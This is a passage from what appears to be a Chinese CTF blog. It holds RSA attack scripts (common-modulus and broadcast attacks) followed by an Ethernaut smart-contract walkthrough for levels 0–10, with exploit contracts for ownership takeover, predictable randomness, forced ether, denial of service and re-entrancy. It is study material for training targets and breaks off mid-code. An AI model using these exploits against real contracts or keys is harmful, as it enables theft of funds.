pow(c1,s1,n)*pow(c2,s2,n) % n print n2s(m) 当然还有这种类型的共模攻击,脚本如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#!/usr/bin/env python# -*- coding: utf-8 -*-import sys,gmpy,base64def egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) * y, y)def modinv(a, m): g, x, y = egcd(a, m) if g != 1: raise Exception('modular inverse does not exist') else: return x % mdef pad_even(x):#重要！凑齐2位，将0x1 变成 0x01 return ('', '0')[len(x)%2] + xdef CipherB2n(c):#将base64编码后的密文转成数字 c2 = base64.b64decode(c) temp = '' for i in c2: temp += pad_even(str(hex(ord(i)))[2:]) temp = eval('0x'+temp) return (temp)def CipherN2b(m):#将数字转换成ascii hex_m=hex(m)[2:] if hex_m[-1] == 'L' : hex_m=hex_m[:-1] return hex_m.decode('hex')if __name__ == '__main__': sys.setrecursionlimit(1000000) e1 = 2333 #根据分解结果 e2 = 23333 #根据分解结果 s = egcd(e1, e2) s1 = s[1] s2 = s[2] c1 = 'XSKBJ2biS6brC5iGwU0GZitHdVM3HXAiwtFnVf2+HTaUqFahxL+BxBi2QDcx7gLxcjEWCMwFP6DS92nMAU4r0gPWSEUIoY57sgNZsjDIDAukiYeLNDUgYz+1P+nF4fk7gwPdozrIvAXGDBvMBjuviqsC8vmVP3I6eLLkt9C46HFt0SBw5ycfAjVoDF2r7/4B1UDs4G0dpIDUCk4khezzgqspn6tqtwOGB27vrKegoL/FlwmutFYIuRKKCBKx3yc/qfWXZ84Oo8nPqgaxgDlxWeLtGM9ZouwFKnagmjbnH+58Pescw4XYafXKqFjQz3XrK/uUESE8jIEIPeL1+8yUpw==' c2 ='EruzwVAXSVLC3rldjcsx6HO0UUICdR9xxgr9eWNhIW0T8l2O3yT/LlFLK2+YU0HB97xr5HaiZesk4T6IuJ9+iOzB8YSkWMfYvOSDKn7Jng/1Q3wQuoldm+UurmZkiEs9kFi+EhsCNAbVAnLzLXLwzYm3emamueDqru4Doo/lSMz8p0+jqz24HscJN9shU85WX4JngW92REHHV8rPHaisCdxeAs+uPyTNzO4IbwDaJvw3ZR/Lo4m1K2Qw8PbYnOcgVr9CWR7mVyxofoWk6qWpQf3d0fX6wbbPcQkXxnnqLWy5S3PZcNQa1wkfRTJJO03QmNVsOivXGb3GzmeZbxmVhQ==' c1 = CipherB2n(c1) c2 = CipherB2n(c2) #print hex(c1) n = 17362520124149736059291605717839814089431261833972408175766504894876091272021197374480215582589878198406028065354454242540322618614670160317701698407729515781811530180885334265851364490357884909336085410775168953942120359215038925025305363480538685487988827339463890539279008285241711326041868183805848503077373967082910932422798165242481154593794712639251157856102009630894845049984346776659339380886766804814959778048440996937820138560802077375885700500737699904011032451007341777160586467318264288370080315519305800247682611802774996999330812534723806925426052547128371180683265963525581842037399869323246530085399 #共n if s1&lt;0: s1 = - s1 c1 = modinv(c1, n) elif s2&lt;0: s2 = - s2 c2 = modinv(c2, n) m=(pow(c1,s1,n)*pow(c2,s2,n)) % n print m print CipherN2b(m) 低加密指数广播攻击如果选取的加密指数较低，并且使用了相同的加密指数给一个接受者的群发送相同的信息，那么可以进行广播攻击得到明文。即，选取了相同的加密指数e（这里取e=3），对相同的明文m进行了加密并进行了消息的传递，那么有： $$C_1\equiv m^{e} mod(n_1)$$$$C_2\equiv m^{e} mod(n_2)$$$$C_3\equiv m^{e} mod(n_3)$$ 对上述等式运用中国剩余定理，在e=3时，可以得到： $$C_x\equiv m^{3} mod(n_1n_2n_3)$$ 通过对Cx进行三次开方可以求得明文。 例题:XCTF 4th-WHCTF-2017 OldDriver题目给了如下信息：12345678910[&#123;&quot;c&quot;: 7366067574741171461722065133242916080495505913663250330082747465383676893970411476550748394841437418105312353971095003424322679616940371123028982189502042, &quot;e&quot;: 10, &quot;n&quot;: 25162507052339714421839688873734596177751124036723831003300959761137811490715205742941738406548150240861779301784133652165908227917415483137585388986274803&#125;,&#123;&quot;c&quot;: 21962825323300469151795920289886886562790942771546858500842179806566435767103803978885148772139305484319688249368999503784441507383476095946258011317951461, &quot;e&quot;: 10, &quot;n&quot;: 23976859589904419798320812097681858652325473791891232710431997202897819580634937070900625213218095330766877190212418023297341732808839488308551126409983193&#125;,&#123;&quot;c&quot;: 6569689420274066957835983390583585286570087619048110141187700584193792695235405077811544355169290382357149374107076406086154103351897890793598997687053983, &quot;e&quot;: 10, &quot;n&quot;: 18503782836858540043974558035601654610948915505645219820150251062305120148745545906567548650191832090823482852604346478335353784501076761922605361848703623&#125;,&#123;&quot;c&quot;: 4508246168044513518452493882713536390636741541551805821790338973797615971271867248584379813114125478195284692695928668946553625483179633266057122967547052, &quot;e&quot;: 10, &quot;n&quot;: 23383087478545512218713157932934746110721706819077423418060220083657713428503582801909807142802647367994289775015595100541168367083097506193809451365010723&#125;,&#123;&quot;c&quot;: 22966105670291282335588843018244161552764486373117942865966904076191122337435542553276743938817686729554714315494818922753880198945897222422137268427611672, &quot;e&quot;: 10, &quot;n&quot;: 31775649089861428671057909076144152870796722528112580479442073365053916012507273433028451755436987054722496057749731758475958301164082755003195632005308493&#125;,&#123;&quot;c&quot;: 17963313063405045742968136916219838352135561785389534381262979264585397896844470879023686508540355160998533122970239261072020689217153126649390825646712087, &quot;e&quot;: 10, &quot;n&quot;: 22246342022943432820696190444155665289928378653841172632283227888174495402248633061010615572642126584591103750338919213945646074833823905521643025879053949&#125;,&#123;&quot;c&quot;: 1652417534709029450380570653973705320986117679597563873022683140800507482560482948310131540948227797045505390333146191586749269249548168247316404074014639, &quot;e&quot;: 10, &quot;n&quot;: 25395461142670631268156106136028325744393358436617528677967249347353524924655001151849544022201772500033280822372661344352607434738696051779095736547813043&#125;,&#123;&quot;c&quot;: 15585771734488351039456631394040497759568679429510619219766191780807675361741859290490732451112648776648126779759368428205194684721516497026290981786239352, &quot;e&quot;: 10, &quot;n&quot;: 32056508892744184901289413287728039891303832311548608141088227876326753674154124775132776928481935378184756756785107540781632570295330486738268173167809047&#125;,&#123;&quot;c&quot;: 8965123421637694050044216844523379163347478029124815032832813225050732558524239660648746284884140746788823681886010577342254841014594570067467905682359797, &quot;e&quot;: 10, &quot;n&quot;: 52849766269541827474228189428820648574162539595985395992261649809907435742263020551050064268890333392877173572811691599841253150460219986817964461970736553&#125;,&#123;&quot;c&quot;: 13560945756543023008529388108446940847137853038437095244573035888531288577370829065666320069397898394848484847030321018915638381833935580958342719988978247, &quot;e&quot;: 10, &quot;n&quot;: 30415984800307578932946399987559088968355638354344823359397204419191241802721772499486615661699080998502439901585573950889047918537906687840725005496238621&#125;] 脚本如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657# coding:utf8from struct import pack,unpackimport zlibimport gmpydef my_parse_number(number): string = "%x" % number #if len(string) != 64: # return "" erg = [] while string != '': erg = erg + [chr(int(string[:2], 16))] string = string[2:] return ''.join(erg)def extended_gcd(a, b): x,y = 0, 1 lastx, lasty = 1, 0 while b: a, (q, b) = b, divmod(a,b) x, lastx = lastx-q*x, x y, lasty = lasty-q*y, y return (lastx, lasty, a)def chinese_remainder_theorem(items): N = 1 for a, n in items: N *= n result = 0 for a, n in items: m = N/n r, s, d = extended_gcd(n, m) if d != 1: N=N/n continue #raise "Input not pairwise co-prime" result += a*s*m return result % N, Nsessions=[&#123;"c": 7366067574741171461722065133242916080495505913663250330082747465383676893970411476550748394841437418105312353971095003424322679616940371123028982189502042, "e": 10, "n": 25162507052339714421839688873734596177751124036723831003300959761137811490715205742941738406548150240861779301784133652165908227917415483137585388986274803&#125;,&#123;"c": 21962825323300469151795920289886886562790942771546858500842179806566435767103803978885148772139305484319688249368999503784441507383476095946258011317951461, "e": 10, "n": 23976859589904419798320812097681858652325473791891232710431997202897819580634937070900625213218095330766877190212418023297341732808839488308551126409983193&#125;,&#123;"c": 6569689420274066957835983390583585286570087619048110141187700584193792695235405077811544355169290382357149374107076406086154103351897890793598997687053983, "e": 10, "n": 18503782836858540043974558035601654610948915505645219820150251062305120148745545906567548650191832090823482852604346478335353784501076761922605361848703623&#125;,&#123;"c": 4508246168044513518452493882713536390636741541551805821790338973797615971271867248584379813114125478195284692695928668946553625483179633266057122967547052, "e": 10, "n": 23383087478545512218713157932934746110721706819077423418060220083657713428503582801909807142802647367994289775015595100541168367083097506193809451365010723&#125;,&#123;"c": 22966105670291282335588843018244161552764486373117942865966904076191122337435542553276743938817686729554714315494818922753880198945897222422137268427611672, "e": 10, "n": 31775649089861428671057909076144152870796722528112580479442073365053916012507273433028451755436987054722496057749731758475958301164082755003195632005308493&#125;,&#123;"c": 17963313063405045742968136916219838352135561785389534381262979264585397896844470879023686508540355160998533122970239261072020689217153126649390825646712087, "e": 10, "n": 22246342022943432820696190444155665289928378653841172632283227888174495402248633061010615572642126584591103750338919213945646074833823905521643025879053949&#125;,&#123;"c": 1652417534709029450380570653973705320986117679597563873022683140800507482560482948310131540948227797045505390333146191586749269249548168247316404074014639, "e": 10, "n": 25395461142670631268156106136028325744393358436617528677967249347353524924655001151849544022201772500033280822372661344352607434738696051779095736547813043&#125;,&#123;"c": 15585771734488351039456631394040497759568679429510619219766191780807675361741859290490732451112648776648126779759368428205194684721516497026290981786239352, "e": 10, "n": 32056508892744184901289413287728039891303832311548608141088227876326753674154124775132776928481935378184756756785107540781632570295330486738268173167809047&#125;,&#123;"c": 8965123421637694050044216844523379163347478029124815032832813225050732558524239660648746284884140746788823681886010577342254841014594570067467905682359797, "e": 10, "n": 52849766269541827474228189428820648574162539595985395992261649809907435742263020551050064268890333392877173572811691599841253150460219986817964461970736553&#125;,&#123;"c": 13560945756543023008529388108446940847137853038437095244573035888531288577370829065666320069397898394848484847030321018915638381833935580958342719988978247, "e": 10, "n": 30415984800307578932946399987559088968355638354344823359397204419191241802721772499486615661699080998502439901585573950889047918537906687840725005496238621&#125;]data = []for session in sessions: e=session['e'] n=session['n'] msg=session['c'] data = data + [(msg, n)]print "Please wait, performing CRT"x, n = chinese_remainder_theorem(data)e=session['e']realnum = gmpy.mpz(x).root(e)[0].digits()print my_parse_number(int(realnum))]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ethernaut训练]]></title>
    <url>%2F2019%2F01%2F08%2Fethernautd%E8%AE%AD%E7%BB%83%2F</url>
    <content type="text"><![CDATA[简介ethernaut包含有22道智能合约的训练题目，而最近有关智能合约的题也是在不断的出现，所以还是有必要了解一下的(顺便了解下这种题目怎么做) 题目链接 另外也放上大哥的writeup跟着学习一下链接 level 0 - Hello Ethernaut题目链接 第一步首先是简单的教程，先下载MetaMask插件并且注册账号，然后设置钱包并使用Ropsten测试网络 第二步打开控制台，然后会发现给了合约地址和help 其中level地址为 0xdf51a9e8ce57e7787e4a27dd19880fd7106b9a5c在Ropsten测试网络下还会有你的player地址和Ethernaut地址使用player指令可以直接获得player地址 第三步之后会让你使用getBalance函数获得你的以太坊的数量，并且让你使用help(),由于我们第二步使用过，就不再演示了PS:由于在Ropsten测试网络中可以直接通过Ether Faucet获得测试以太坊，所以我的数额为7 第四步使用ethernaut指令可以直接输出当前合约的有关信息，其中的abi可以理解为合约中的公共方法列表，当然在下面可以看见例如owner: f()之类的东西就是方法的具体信息 第五步与ABI互动，也就是可以调用上一步说的方法列表里的方法，系统让我们调用ethernaut.owner()，返回的是智能合约的拥有者 第六步这一步就是让我们通过上面提到的Ether Faucet获得测试以太坊，可以将MetaMask调至中文，然后点击存入-测试水管，之后点击request 1 ether from faucet就行 第七步生成合约实例，点击下面的蓝色按钮即可，需要等待一段时间 成功之后会显示下图 第八步题目告诉你生成的合约实例可以调用合约的ABI，也可以自己试试，用contract.方法就行 第九步从contract.info()入手跟着走下去就行 之后点击submit instance即可过关。 通关后的彩蛋 Congratulations! You have completed the tutorial. Have a look at the Solidity code for the contract you just interacted with below.You are now ready to complete all the levels of the game, and as of now, you’re on your own.Godspeed!! level 1 - Fallback题目链接 胜利条件1.获得合约的所有权2.收回合约的所有余额 tips1.如何用ABI发送ether2.如何用ABI以外的方法发送ether3.查看help()会有帮助4.Fallback方法 源码123456789101112131415161718192021222324252627282930313233pragma solidity ^0.4.18;import 'zeppelin-solidity/contracts/ownership/Ownable.sol';contract Fallback is Ownable &#123; mapping(address =&gt; uint) public contributions; function Fallback() public &#123; //构造函数，初始化owner的contributions为1000 contributions[msg.sender] = 1000 * (1 ether); &#125; function contribute() public payable &#123; //将合约拥有权交给贡献1000ETH以上的人 require(msg.value &lt; 0.001 ether); contributions[msg.sender] += msg.value; if(contributions[msg.sender] &gt; contributions[owner]) &#123; owner = msg.sender; &#125; &#125; function getContribution() public view returns (uint) &#123; //查询contribution return contributions[msg.sender]; &#125; function withdraw() public onlyOwner &#123; //owner收回合约的所有余额，只有owner可以调用 owner.transfer(this.balance); &#125; function() payable public &#123; //fallback函数，当满足发送的value大于1并且发送者的contributions的值大于1时将owner变为消息发送者 require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0); owner = msg.sender; &#125;&#125; 预备知识回退函数(fallback function)1.每一个合约有且仅有一个没有名字的函数。这个函数无参数，也无返回值。如果调用合约时，没有匹配上任何一个函数(或者没有传哪怕一点数据)，就会调用默认的回退函数。 2.此外，当合约收到ether时（没有任何其它数据），这个函数也会被执行。向合约发送 send、transfer、call 消息时候都会调用 fallback 函数，不同的是 send 和 transfer 有 2300 gas 的限制，也就是传递给 fallback 的只有 2300 gas，这个 gas 只能用于记录日志，因为其他操作都将超过 2300 gas。但 call 则会把剩余的所有 gas 都给 fallback 函数，这有可能导致循环调用。 我们在这里要用到的就是第二点 解题思路最终目的是调用withdraw()方法将余额清零，也就是我们要成为ownercontribute里面虽然有可能称为owner，但是代价太过昂贵（1000ETH且每次只能发送小于0.001的ETH）在fallback中只要满足msg.value&gt;0且contributions[msg.sender]&gt;0即可成为owner其中msg.value我们可以直接发送过去，而contributions[msg.sender]我们需要调用contribute()这个函数，也就是参数满足value&lt;0.001的条件就行 具体步骤1.调用contribute函数，传入参数value=1其中value的单位是wei 11 eth = 1e9 Gwei = 1e18 wei 2.调用send函数，传入参数1(也可以在钱包里直接打钱，不过听说打钱会有bug，就直接用send了，当然也可以用contract.sendTransaction({value: 100}))， 由于send函数会调用fallback函数，我们便成为了owner 3.调用withdraw函数，将钱卷走 4.点击submit instance即可过关。 注意事项绝对不要操作太快了，每一步传值的时候都要等到右下弹出提示再继续,否则可能和我一样一个账号40多条操作在排队，过了一个小时都没反应,只能再开一个账号(:зゝ∠) 通关后的彩蛋 You know the basics of how ether goes in and out of contracts, including the usage of the fallback method.You’ve also learnt about OpenZeppelin’s Ownable contract, and how it can be used to restrict the usage of some methods to a priviledged address.Move on to the next level when you’re ready! level 2 - Fallout题目链接 胜利条件1.获得合约的所有权 tips1.Solidity Remix IDE 源码12345678910111213141516171819202122232425262728293031pragma solidity ^0.4.18;import 'zeppelin-solidity/contracts/ownership/Ownable.sol';contract Fallout is Ownable &#123; mapping (address =&gt; uint) allocations; /* constructor */ function Fal1out() public payable &#123; owner = msg.sender; allocations[owner] = msg.value; &#125; function allocate() public payable &#123; allocations[msg.sender] += msg.value; &#125; function sendAllocation(address allocator) public &#123; require(allocations[allocator] &gt; 0); allocator.transfer(allocations[allocator]); &#125; function collectAllocations() public onlyOwner &#123; msg.sender.transfer(this.balance); &#125; function allocatorBalance(address allocator) public view returns (uint) &#123; return allocations[allocator]; &#125;&#125; 解题思路可以看出函数的构造函数写错了，Fallout写成了Fal1out，变为了谁都可以调用的函数(我们无法调用构造函数)。所以我们可以调用构造函数成为owner，然后再调用collectAllocations取钱 具体步骤1.调用Fal1out函数，成为owner 2.调用collectAllocations函数，将钱卷走 3.点击submit instance即可过关。 通关后的彩蛋 That was silly wasn’t it? Real world contracts must be much more secure than this and so must it be much harder to hack them right?Well… Not quite.The story of Rubixi is a very well known case in the Ethereum ecosystem. The company changed its name from ‘Dynamic Pyramid’ to ‘Rubixi’ but somehow they didn’t rename the constructor method of its contract:12345&gt; contract Rubixi &#123;&gt; address private owner;&gt; function DynamicPyramid() &#123; owner = msg.sender; &#125;&gt; function collectAllFees() &#123; owner.transfer(this.balance) &#125;&gt; ... This allowed the attacker to call the old constructor and claim ownership of the contract, and steal some funds. Yep. Big mistakes can be made in smartcontractland. level 3 - Coin Flip题目链接 胜利条件1.猜抛硬币的结果，连续猜对十次即可获胜 源码12345678910111213141516171819202122232425262728293031pragma solidity ^0.4.18;contract CoinFlip &#123; uint256 public consecutiveWins; uint256 lastHash; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; function CoinFlip() public &#123; consecutiveWins = 0; &#125; function flip(bool _guess) public returns (bool) &#123; uint256 blockValue = uint256(block.blockhash(block.number-1)); if (lastHash == blockValue) &#123; revert(); &#125; lastHash = blockValue; uint256 coinFlip = blockValue / FACTOR; bool side = coinFlip == 1 ? true : false; if (side == _guess) &#123; consecutiveWins++; return true; &#125; else &#123; consecutiveWins = 0; return false; &#125; &#125;&#125; 预备知识1.revert()这行代码：if(msg.sender != owner) { throw; }完全等价于如下三种形式：if(msg.sender != owner) { revert(); }assert(msg.sender == owner);require(msg.sender == owner); 解题思路1.从随机数逻辑生成来看，主要有三个步骤&nbsp;&nbsp;&nbsp;&nbsp;a.获取上一个块的hash&nbsp;&nbsp;&nbsp;&nbsp;b.判断hash是否和上一次的hash相同，相同则回退&nbsp;&nbsp;&nbsp;&nbsp;c.根据blockValue/FACTOR的结果判断硬币正负 2.我们每次产生的随机数和前一块的hash有关，只需要编写合约进行同步计算即可 具体步骤1.编写exp合约1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556pragma solidity ^0.4.18;contract CoinFlip &#123; uint256 public consecutiveWins; uint256 lastHash; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; function CoinFlip() public &#123; consecutiveWins = 0; &#125; function flip(bool _guess) public returns (bool) &#123; uint256 blockValue = uint256(block.blockhash(block.number-1)); if (lastHash == blockValue) &#123; revert(); &#125; lastHash = blockValue; uint256 coinFlip = blockValue / FACTOR; bool side = coinFlip == 1 ? true : false; if (side == _guess) &#123; consecutiveWins++; return true; &#125; else &#123; consecutiveWins = 0; return false; &#125; &#125;&#125;contract exp&#123; CoinFlip C; uint256 lastHash; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968 function setCoinflip(address _addr) public &#123; C = CoinFlip(_addr); &#125; function hack() public OwnerOnly &#123; uint256 blockValue = uint256(block.blockhash(block.number-1)); if (lastHash == blockValue) &#123; revert(); &#125; lastHash = blockValue; uint256 coinFlip = blockValue / FACTOR; bool side = coinFlip == 1 ? true : false; C.flip(side); &#125;&#125; 2.部署在remix上并运行hack方法十次 3.通过命令contract.consecutiveWins()可查询猜对的次数 4.当猜对的次数为10次以上之后，点击submit instance即可过关。 通关后的彩蛋 Generating random numbers in solidity can be tricky. There currently isn’t a native way to generate them, and everything you use in smart contracts is publicly visible, including the local variables and state variables marked as private. Miners also have control over things like blockhashes, timestamps, and whether to include certain transactions - which allows them to bias these values in their favor. Some options include using Bitcoin block headers (verified through BTC Relay), RANDAO, or Oraclize). level 4- Telephone题目链接 胜利条件1.获得合约的所有权 tips1.See the Help page above, section &quot;Beyond the console&quot;,这一节主要就是教你可以使用Remix和Truffle进行合约编写和attack，也就是我们所说的写exp并运行。 源码12345678910111213141516pragma solidity ^0.4.18;contract Telephone &#123; address public owner; function Telephone() public &#123; owner = msg.sender; &#125; function changeOwner(address _owner) public &#123; //如果消息发送者不是owner就将owner转移给_owner if (tx.origin != msg.sender) &#123; owner = _owner; &#125; &#125;&#125; 预备知识1.tx.origin 全局变量，也就是合约的owner 解题思路1.我们可以编写代码调用changeOwner，传入我们的地址，就可以变成合约owner了 具体步骤1.编写exp合约123456789101112131415161718192021222324252627pragma solidity ^0.4.18;contract Telephone &#123; address public owner; function Telephone() public &#123; owner = msg.sender; &#125; function changeOwner(address _owner) public &#123; //如果消息发送者不是owner就将owner转移给_owner if (tx.origin != msg.sender) &#123; owner = _owner; &#125; &#125;&#125;contract exp&#123; Telephone tel; function setAttackAddr(address _addr)&#123; tel = Telephone(_addr); &#125; function attack(address _addr)&#123; tel.changeOwner(_addr); &#125;&#125; 2.获取合约地址和我们自己的用户地址，并查询合约拥有者 3.进行攻击 4.再次查询合约拥有者，发现变成了我们，攻击完毕 5.点击submit instance即可过关。 通关后的彩蛋 While this example may be simple, confusing tx.origin with msg.sender can lead to phishing-style attacks, such as this.An example of a possible attack is outlined below.1.Use tx.origin to determine whose tokens to transfer, e.g.1234&gt; function transfer(address _to, uint _value) &#123;&gt; tokens[tx.origin] -= _value;&gt; tokens[_to] += _value;&gt; &#125; 2.Attacker gets victim to send funds to a malicious contract that calls the transfer function of the token contract, e.g.123&gt; function () payable &#123;&gt; token.transfer(attackerAddress, 10000);&gt; &#125; In this scenario, tx.origin will be the victim’s address (while msg.sender will be the malicious contract’s address), resulting in the funds being transferred from the victim to the attacker. level 5- Token题目链接 胜利条件1.攻击Token代币合约2.开始时会获取20个代币，我们需要获得额外的、大量的代币 tips1.odometer 源码12345678910111213141516171819202122pragma solidity ^0.4.18;contract Token &#123; mapping(address =&gt; uint) balances; uint public totalSupply; function Token(uint _initialSupply) public &#123; //初始化代币给owner balances[msg.sender] = totalSupply = _initialSupply; &#125; function transfer(address _to, uint _value) public returns (bool) &#123; //将msg.sender的value个代币转给_to，并且msg.sender-value的值大于0 require(balances[msg.sender] - _value &gt;= 0); balances[msg.sender] -= _value; balances[_to] += _value; return true; &#125; function balanceOf(address _owner) public view returns (uint balance) &#123; //查询代币数量 return balances[_owner]; &#125;&#125; 解题思路1.从transfer函数可以看出是很明显的整数溢出漏洞，转给别的地址大于20个代币即可 具体步骤1.初始化信息 2.进行转账操作，随便填一个地址，然后查询我们和转账地址的代币数，发现已经溢出 3.点击submit instance即可过关。 通关后的彩蛋 Overflows are very common in solidity and must be checked for with control statements such as:123&gt; if(a + c &gt; a) &#123;&gt; a = a + c;&gt; &#125; An easier alternative is to use OpenZeppelin’s SafeMath library that automatically checks for overflows in all the mathematical operators. The resulting code looks like this:1&gt; a = a.add(c); If there is an overflow, the code will revert. level 6- Delegation题目链接 胜利条件1.获得合约的所有权 tips1.查看Solidity文档中关于delegatecall low level function的内容2.Fallback方法3.Method ids 源码12345678910111213141516171819202122232425262728293031pragma solidity ^0.4.18;contract Delegate &#123; address public owner; function Delegate(address _owner) public &#123; owner = _owner; &#125; function pwn() public &#123; owner = msg.sender; &#125;&#125;contract Delegation &#123; address public owner; Delegate delegate; function Delegation(address _delegateAddress) public &#123; //初始化 delegate = Delegate(_delegateAddress); owner = msg.sender; &#125; function() public &#123; //FallBack函数 if(delegate.delegatecall(msg.data)) &#123; //执行参数为data的delegatecall this; &#125; &#125;&#125; 预备知识1.delegatecall简单来说就是delegatecall执行别的合约的方法的时候的作用域是调用合约的环境。比如别的合约的方法修改了它的第一个参数b，调用合约通过delegatecall调用该方法时，会把调用合约的第一个参数给修改掉(并且哪怕名字不一样也可以)具体内容可以参考这篇文章，写的挺详细的链接 解题思路1.首先我们的目的是通过delegatecall来执行Delegate合约中的pwn方法，进而通过delegatecall的漏洞来改变Delegation合约的owner，也就是改成我们。2.为了执行delegatecall，我们需要执行fallback函数，传入的data参数应该为pwn()的函数id，即其函数签名的sha3的前4个bytes(也就是4*2+2(0x)=10位) 具体步骤1.初始化实例并查看合约的owner 2.构造exp并执行contract.sendTransaction({data:web3.sha3(&quot;pwn()&quot;).slice(0,10)}).完毕之后查看owner，发现已经变成我们 3.点击submit instance即可过关。 通关后的彩蛋 Usage of delegatecall is particularly risky and has been used as an attack vector on multiple historic hacks. With it, your contract is practically saying “here, -other contract- or -other library-, do whatever you want with my state”. Delegates have complete access to your contract’s state. The delegatecall function is a powerful feature, but a dangerous one, and must be used with extreme care. Please refer to the The Parity Wallet Hack Explained article for an accurate explanation of how this idea was used to steal 30M USD. level 7- Force题目链接 胜利条件1.让合约的balance&gt;0 tips1.Fallback方法2.用其他合约去攻击这个合约3.用Remix或Truffle 源码1234567891011pragma solidity ^0.4.18;contract Force &#123;/* MEOW ? /\_/\ / ____/ o o \ /~____ =ø= / (______)__m_m)*/&#125; 预备知识1.selfdestruct函数(析构函数)selfdestruct(address)会将当前合约的余额发送至address。 2.没有fallback函数如何往合约里打钱？当合约没有实现payable fallback函数的时候，依然有两种方法给合约里打钱&nbsp;&nbsp;&nbsp;&nbsp;a.将合约作为挖矿地址挖矿&nbsp;&nbsp;&nbsp;&nbsp;b.调用其他合约的析构函数selfdestruct并将此合约的地址作为参数 解题思路1.我们自己编写一个合约并约束一个方法为payable，并通过该方法向此合约中打钱。2.调用此合约的selfdestruct函数，将目标合约地址作为参数传入。这样此合约的剩下的钱就会被转移过去。 具体步骤1.编写exp合约12345678910contract exp&#123; address attackAddr; function init(address _addr) public payable&#123; attackAddr=_addr; &#125; function attack()&#123; selfdestruct(attackAddr); &#125;&#125; 2.先调用init函数设置攻击合约的地址，并附加上一定数额的ETH 3.再调用attack函数进行转钱 3.点击submit instance即可过关。 通关后的彩蛋 In solidity, for a contract to be able to receive ether, the fallback function must be marked ‘payable’.However, there is no way to stop an attacker from sending ether to a contract by self destroying. Hence, it is important not to count on the invariant this.balance == 0 for any contract logic. level 8- Vault题目链接 胜利条件1.获得password并调用unlock函数使得locked参数变为false 源码1234567891011121314151617pragma solidity ^0.4.18;contract Vault &#123; bool public locked; bytes32 private password; function Vault(bytes32 _password) public &#123; locked = true; password = _password; &#125; function unlock(bytes32 _password) public &#123; if (password == _password) &#123; locked = false; &#125; &#125;&#125; 预备知识1.在区块链上所有的块以及信息都是公开的，所以即使合约中使用了private，该信息依然是公开的，可以随时被别人查看。 解题思路1.通过读取区块链上的块中的信息获取password2.用该password作为参数调用unlock函数进行解锁 具体步骤1.通过web3.eth.getStorageAt(contract.address,1,(e,v)=&gt;alert(web3.toAscii(v)))指令查看password 2.将password传入unlock函数 3.点击submit instance即可过关。 通关后的彩蛋 It’s important to remember that marking a variable as private only prevents other contracts from accessing it. State variables marked as private and local variables are still publicly accessible.To ensure that data is private, it needs to be encrypted before being put onto the blockchain. In this scenario, the decryption key should never be sent on-chain, as it will then be visible to anyone who looks for it. zk-SNARKs provide a way to determine whether someone possesses a secret parameter, without ever having to reveal the parameter. level 9- King题目链接 胜利条件1.你可以通过打钱成为新的King，当然前提是你的前比上一个King的钱多2.当你点击Submit的时候合约会重新变为King，你要想办法去保持King位 源码123456789101112131415161718192021pragma solidity ^0.4.18;import 'zeppelin-solidity/contracts/ownership/Ownable.sol';contract King is Ownable &#123; address public king; uint public prize; function King() public payable &#123; king = msg.sender; prize = msg.value; &#125; function() external payable &#123; //打更多的钱或者合约owner都可以调用此方法变为king require(msg.value &gt;= prize || msg.sender == owner); king.transfer(msg.value); king = msg.sender; prize = msg.value; &#125;&#125; 预备知识1.Solidity 中几种转币方式。 &lt;address&gt;.transfer()&nbsp;&nbsp;&nbsp;&nbsp;当发送失败时会 throw; 回滚状态&nbsp;&nbsp;&nbsp;&nbsp;只会传递部分 Gas 供调用，防止重入（reentrancy） &lt;address&gt;.send()&nbsp;&nbsp;&nbsp;&nbsp;当发送失败时会返回 false&nbsp;&nbsp;&nbsp;&nbsp;只会传递部分 Gas 供调用，防止重入（reentrancy） &lt;address&gt;.call.value()()&nbsp;&nbsp;&nbsp;&nbsp;当发送失败时会返回 false&nbsp;&nbsp;&nbsp;&nbsp;传递所有可用 Gas 供调用，不能有效防止重入（reentrancy） 解题思路1.由于最后合约owner会调用fallback函数成为新的king，所以我们需要阻止这个函数的运行，也就是阻止transfer2.我们可以自己写个合约并将fallback函数设为revert()，这样就没有人可以通过transfer()打钱给我们。当然我们甚至可以不写fallback函数也可以实现这个效果 具体步骤1.编写exp合约(试了好几种写法都不行，只有这种可以，奇怪了)12345678pragma solidity ^0.4.18;contract exp &#123; function exp() public payable &#123; address attackAddr = 0x529c6e4d28d24af49eada89a2f7effa44c8f58c3; attackAddr.call.gas(1000000).value(msg.value)(); &#125;&#125; 2.部署合约，注意要传入比原先的1ETH多 3.查看king可以发现king已经变成了我们部署的合约的地址 4.点击submit instance即可过关。 通关后的彩蛋 Most of Ethernaut’s levels try to expose (in an oversimpliefied form of course) something that actually happend. A real hack or a real bug.In this case, see: King of the Ether and King of the Ether Postmortem level 10- Re-entrancy题目链接 胜利条件1.将合约中的所有钱卷走 tips1.不可信的合约可以执行人们不希望出现的代码2.Fallback方法3.Throw/revert bubbling4.用其他合约去攻击这个合约5.用Remix或Truffle 源码12345678910111213141516171819202122232425pragma solidity ^0.4.18;contract Reentrance &#123; mapping(address =&gt; uint) public balances; function donate(address _to) public payable &#123; balances[_to] += msg.value; &#125; function balanceOf(address _who) public view returns (uint balance) &#123; return balances[_who]; &#125; function withdraw(uint _amount) public &#123; if(balances[msg.sender] &gt;= _amount) &#123; if(msg.sender.call.value(_amount)()) &#123; _amount; &#125; balances[msg.sender] -= _amount; &#125; &#125; function() public payable &#123;&#125;&#125; 解题思路这是一个比较著名的重入漏洞，漏洞点在withdraw，它会先判断账户是否有那么多余额在调用call进行转账，然后再将balances中的金额减少。但是我们前面说过call过去的地址如果是个合约地址，并且合约的fallback函数也调用了withdraw函数，那么这就会成为一个递归问题，一直到gas=0才会停止。div style=”width: 50%; margin: auto”&gt;所以我们可以利用这个机制编写合约将钱全部提出。 具体步骤1.编写exp合约12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061pragma solidity ^0.4.18;contract Reentrance &#123; mapping(address =&gt; uint) public 